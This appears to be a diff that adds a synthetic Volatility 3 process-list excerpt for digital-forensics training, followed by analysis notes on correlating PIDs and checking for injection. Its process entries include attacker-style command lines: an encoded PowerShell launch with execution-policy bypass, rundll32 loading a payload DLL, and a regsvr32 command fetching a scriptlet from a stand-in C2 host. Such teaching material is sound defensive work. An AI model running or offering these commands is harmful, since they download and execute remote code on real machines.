@@ -1,0 +1,16 @@
+## Synthetic Volatility 3 style excerpt (education only)
+## Plugin: windows.pslist.PsList (illustrative)
+ Volatility 3 Framework 2.5.0
+
+PID    PPID   ImageFileName          CommandLine
+----   ----   -------------          -----------
+4488   1234   explorer.exe           C:\Windows\explorer.exe
+5102   4488   malware_32.exe         "C:\Users\Public\cache\malware_32.exe"
+5120   5102   cmd.exe                cmd.exe /c whoami
+6040   6012   powers.exe             powershell.exe -NoProfile -ExecutionPolicy Bypass -enc JABzAD0...
+6066   6040   rundll32.exe           rundll32.exe C:\Users\Public\Updates\payload_init.dll,DllRegisterServer
+7310   4488   regsvr32.exe           regsvr32.exe /s /u /i:http://malware-c2.example/s.sct scrobj.dll
+
+## Notes
+- Correlate PIDs with EDR and PCAP timestamps per scenario folder.
+- Run malfind / ldrmodules on suspicious processes for injection scenarios.
